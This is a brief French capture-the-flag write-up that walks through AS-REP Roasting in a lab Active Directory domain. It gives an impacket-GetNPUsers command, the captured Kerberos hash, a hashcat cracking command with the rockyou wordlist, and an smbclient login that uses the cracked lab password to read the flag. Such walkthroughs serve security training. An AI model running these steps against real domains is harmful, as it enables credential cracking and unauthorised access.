Chall 3 AD :

Ici le sujet indique Pre-Auth-Opsy
une attaque connue sur le pre-auth est la méthode d'attaque sur AS-REP  qui correspond au a la préauthentification Kerberos : AS-REP Roasting


donc on cherche à lister les comptes sans pre auth : 

```impacket-GetNPUsers mh.local/svc_ctf:cookies -dc-ip 192.168.1.1 -request```

on trouve
```$krb5asrep$23$svc_mh@MH.LOCAL:10382d67ca3f2498aaf22eac0186b411$```


même principe que pour le chall 2, on bruteforce le Hash :
```hashcat -m 18200 asrep.txt /usr/share/eaphammer/wordlists/rockyou.txt```

on trouve donc le combo svc_mh:barbie

```smbclient //192.168.1.1/FLAGCHALL5 -U 'MH\svc_mh%barbie'```

et là petit ls
```type flag.txt

fl@g{AsR3pR0ast3d}```

bravo tu as flag le chall AD3
